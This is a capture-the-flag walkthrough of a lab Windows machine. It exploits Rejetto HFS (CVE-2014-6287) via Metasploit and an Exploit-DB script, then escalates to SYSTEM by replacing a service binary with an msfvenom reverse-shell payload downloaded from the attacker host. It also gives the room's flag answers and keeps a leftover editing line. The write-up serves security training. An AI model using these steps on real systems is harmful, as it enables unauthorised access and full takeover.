# Steel Mountain

## Introduction

In this room, you will enumerate a Windows machine, gain initial access with Metasploit, use PowerShell to further enumerate the machine, and escalate your privileges to Administrator.

If you don't have the right security tools and environment, deploy your own Kali Linux machine and control it in your browser with our Kali Room. Please note that this machine does not respond to ping (ICMP) and may take a few minutes to boot up.

### Deploying the Machine

To begin, deploy the machine provided in the room. This step is crucial as it sets up the environment you will be working in for the rest of the tasks.

### Q1. Who is the employee of the month?

#### Action

To find out who the employee of the month is, you can retrieve the webpage hosted on the target machine by running the following commands:

```bash
curl -s http://10.10.97.217/ --output index.html
cat index.html 
```

**Sample Output:**

```html
<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>Steel Mountain</title>
<style>
* {font-family: Arial;}
</style>
</head>
<body><center>
<a href="index.html"><img src="/img/logo.png" style="width:500px;height:300px;"/></a>
<h3>Employee of the month</h3>
<img src="/img/BillHarper.png" style="width:200px;height:200px;"/>
</center>
</body>
</html>
```

**Ans:** Bill Harper

## Initial Access

Now that you have deployed the machine, let's work on gaining an initial shell.

### Q1. Scan the machine with Nmap. What is the other port running a web server on?

#### Action

To identify the ports and services running on the target machine, run the following Nmap command:

```bash
sudo nmap -sS -T5 -A -p 1-10000 10.10.131.197
```

**Sample Output:**

```bash
Starting Nmap 7.60 ( https://nmap.org ) at 2024-08-19 21:28 BST
Warning: 10.10.131.197 giving up on port because retransmission cap hit (2).
Nmap scan report for ip-10-10-131-197.eu-west-1.compute.internal (10.10.131.197)
Host is up (0.00039s latency).
Not shown: 9993 closed ports
PORT     STATE SERVICE      VERSION
80/tcp   open  http         Microsoft IIS httpd 8.5
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp open  ssl          Microsoft SChannel TLS
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
8080/tcp open  http         HttpFileServer httpd 2.3
```

**Ans:** 8080

**Explanation:**  
The Nmap scan reveals that, besides the standard HTTP port 80, there is another web server running on port 8080. This information is crucial for further enumeration and potential exploitation.

### Q2. Take a look at the other web server. What file server is running?

#### Action

To identify the service running on port 8080, connect to it using a web browser or a tool like curl:

```bash
curl http://10.10.131.197:8080
```

Upon connecting, you'll see that the server is running **HFS (HttpFileServer)**. A link at the bottom of the page points to http://www.rejetto.com/hfs/.

**Ans:** Rejetto HttpFileServer

**Explanation:**  
The web page reveals that the server is running Rejetto HttpFileServer. Identifying the specific service is key to finding vulnerabilities associated with it.

### Q3. What is the CVE number to exploit this file server?

#### Action

Search for vulnerabilities related to Rejetto HttpFileServer version 2.3 using a database like Exploit-DB. The relevant CVE for this version is:

**Ans:** CVE-2014-6287

**Explanation:**  
CVE-2014-6287 is a known vulnerability in Rejetto HttpFileServer version 2.3, which can be exploited to gain unauthorized access.

### Q4. Use Metasploit to get an initial shell. What is the user flag?

#### Action

Start Metasploit and use the exploit for CVE-2014-6287:

```bash
msfconsole -q
msf5 > search cve-2014-6287
msf5 > use exploit/windows/http/rejetto_hfs_exec
msf5 exploit(windows/http/rejetto_hfs_exec) > set RHOSTS 10.10.131.197
msf5 exploit(windows/http/rejetto_hfs_exec) > set RPORT 8080
msf5 exploit(windows/http/rejetto_hfs_exec) > set SRVHOST [Your IP]
msf5 exploit(windows/http/rejetto_hfs_exec) > set SRVPORT 5555
msf5 exploit(windows/http/rejetto_hfs_exec) > exploit
```

Once the exploit is successful, you should gain a Meterpreter session. Navigate to the user’s desktop to retrieve the flag:

```bash
meterpreter > cd c:/users/bill/desktop
meterpreter > cat user.txt
```

**Ans:** b04763b6fcf51fcd7c13abc7db4fd365

**Explanation:**  
Using Metasploit to exploit the vulnerability gives you a Meterpreter session, allowing you to navigate the file system and retrieve the user flag from the desktop.

Here is the text reformatted to match the style and template of the first notes:

## Privilege Escalation

To enumerate this machine, we will use a PowerShell script called PowerUp. PowerUp's purpose is to evaluate a Windows machine and determine any abnormalities. According to the developers, "PowerUp aims to be a clearinghouse of common Windows privilege escalation vectors that rely on misconfigurations."

### Downloading PowerUp

You can download the script from GitHub. Ensure you download the raw script rather than the GitHub page to avoid issues. Once downloaded, you can use the upload command in Metasploit to transfer the script to the target machine.

#### Action

To upload the script, use the following command in Meterpreter:

```bash
meterpreter > upload /opt/windows/powersploit/Privesc/PowerUp.ps1
```

**Sample Output:**

```bash
[*] uploading  : /opt/windows/powersploit/Privesc/PowerUp.ps1 -> PowerUp.ps1
[*] Uploaded 549.65 KiB of 549.65 KiB (100.0%): /opt/windows/powersploit/Privesc/PowerUp.ps1 -> PowerUp.ps1
[*] uploaded   : /opt/windows/powersploit/Privesc/PowerUp.ps1 -> PowerUp.ps1
```

### Executing PowerUp

To execute PowerUp using Meterpreter, load PowerShell and then enter the PowerShell environment by using the following commands:

```bash
meterpreter > load powershell
meterpreter > powershell_shell
PS > .\PowerUp.ps1
PS > Invoke-AllChecks
```

**Sample Output:**

```bash
[*] Running Invoke-AllChecks
```

### Q1. What is the name of the service that shows up as an unquoted service path vulnerability?

#### Action

After running `Invoke-AllChecks`, focus on the `CanRestart` option, which is set to true. This option allows us to restart a service on the system. The directory to the application is also writable, meaning we can replace the legitimate application with a malicious one, restart the service, and execute our payload.

**Sample Output:**

```bash
ServiceName   : AdvancedSystemCareService9
Path          : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
StartName     : LocalSystem
AbuseFunction : Write-ServiceBinary -ServiceName 'AdvancedSystemCareService9' -Path <HijackPath>
```

**Ans:** AdvancedSystemCareService9

**Explanation:**  
The `AdvancedSystemCareService9` service has an unquoted service path vulnerability, allowing us to exploit it by replacing the executable with a malicious payload.

### Q2. What is the root flag?

#### Action

To exploit this unquoted service path, generate a reverse shell payload using `msfvenom`:

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.60.84 LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe
```

Upload the binary and replace the legitimate executable. Then restart the service to gain a shell as `NT AUTHORITY\SYSTEM`.

**Sample Commands:**

```bash
meterpreter > cd "C:\Program Files (x86)\IObit"
meterpreter > upload /path/to/Advanced.exe
meterpreter > sc stop AdvancedSystemCareService9
meterpreter > sc start AdvancedSystemCareService9
```

**Sample Output:**

```bash
meterpreter > getuid 
Server username: NT AUTHORITY\SYSTEM
meterpreter > cd c:/users/administrator/desktop
meterpreter > cat root.txt
9af5f314f57607c00fd09803a587db80
```

**Ans:** 9af5f314f57607c00fd09803a587db80

**Explanation:**  
By exploiting the unquoted service path, we escalate our privileges to `NT AUTHORITY\SYSTEM` and retrieve the root flag from the administrator's desktop.

## Access and Escalation Without Metasploit

To begin, we will be using the same CVE, but this time, let's use a different exploit method.

**Note:** You will need to have a web server and a Netcat listener active simultaneously for this to work!

### Preparing the Environment

First, you will need a Netcat static binary on your web server. If you don't have one, you can download it from GitHub.

You will need to run the exploit twice. The first time will pull the Netcat binary to the system, and the second will execute the payload to gain a callback.

### Uploading Netcat and Executing the Exploit

Congratulations, you're now onto the system. Next, we will use PowerShell to pull winPEAS to the system.

#### Action

To begin, download and prepare the necessary files:

1. **Download Netcat:**
   - Get `nc.exe` from [https://eternallybored.org/misc/netcat/netcat-win32-1.11.zip](https://eternallybored.org/misc/netcat/netcat-win32-1.11.zip) and unzip it.
   
2. **Download the Exploit:**
   - Get the exploit from [https://www.exploit-db.com/download/39161](https://www.exploit-db.com/download/39161), rename it to `exploit.py`, and edit it to replace your IP.

3. **Start a Netcat Listener:**
   ```bash
   sudo rlwrap nc -nlvp 443
   ```

4. **Start a Python Web Server:**
   ```bash
   sudo python3 -m http.server 80
   ```

5. **Run the Exploit:**
   ```bash
   python exploit.py 10.10.247.243 8080
   ```

**Sample Output:**

You should see connections to your Python web server and get a shell in your Netcat listener.

```bash
C:\Users\bill\Desktop>more user.txt
b04763b6fcf51fcd7c13abc7db4fd365
```

### Q1. What PowerShell command could we run to manually find out the service name?

#### Action

We could have used PowerShell to list the services as follows:

```bash
powershell -c "Get-Service"
```

**Ans:** powershell -c Get-Service

**Explanation:**  
This command lists all services running on the system, allowing us to identify potential targets for privilege escalation.

### Escalating to Administrator

With our new knowledge, we can now escalate privileges to Administrator.

1. **Generate Payload:**
   Use `msfvenom` to create a reverse shell payload:
   ```bash
   msfvenom -p windows/shell_reverse_tcp LHOST=10.8.50.72 LPORT=443 -e x86/shikata_ga_nai -f exe -o Advanced.exe
   ```

2. **Make the Payload Available:**
   Serve it via your Python web server:
   ```bash
   sudo python3 -m http.server 8000
   ```

3. **Download and Execute the Payload:**
   From the reverse shell, download the executable and restart the service:
   ```bash
   C:\Program Files (x86)\IObit>powershell -c "Invoke-WebRequest -Uri 'http://10.8.50.72/Advanced.exe' -OutFile 'c:\program files (x86)\IObit\Advanced.exe'"
   C:\Program Files (x86)\IObit>sc stop AdvancedSystemCareService9
   C:\Program Files (x86)\IObit>sc start AdvancedSystemCareService9
   ```

4. **Get the Root Flag:**
   Once the service is restarted, you will have a shell as `nt authority\system`:
   ```bash
   C:\Windows\system32>whoami
   nt authority\system

   C:\Windows\system32>more c:\users\administrator\desktop\root.txt
   9af5f314f57607c00fd09803a587db80
   ```

**Ans:** 9af5f314f57607c00fd09803a587db80

**Explanation:**  
By exploiting the unquoted service path, we escalate our privileges to `NT AUTHORITY\SYSTEM` and retrieve the root flag from the administrator's desktop.
